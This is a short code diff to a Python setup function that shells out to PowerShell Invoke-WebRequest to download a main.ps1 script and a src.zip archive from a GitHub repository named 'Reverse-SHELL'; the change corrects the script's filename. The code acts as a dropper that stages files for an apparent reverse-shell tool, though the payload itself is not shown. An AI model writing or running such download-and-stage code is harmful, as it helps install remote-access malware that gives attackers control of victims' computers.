@@ -15,7 +15,7 @@ def setup():
         shell=True)
     # download main.ps1 file
     subprocess.call(
-        f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/main.bat" -outfile "{ps1_path}"',
+        f'powershell.exe invoke-webrequest -uri "https://raw.githubusercontent.com/SmartBoyMuzaffar/Reverse-SHELL/master/main.ps1" -outfile "{ps1_path}"',
         shell=True)
     # download src.zip file
     subprocess.call(f'powershell invoke-webrequest -uri "https://github.com/SmartBoyMuzaffar/Reverse-SHELL/raw/master/src.zip" -outfile "{path}\\src.zip"',
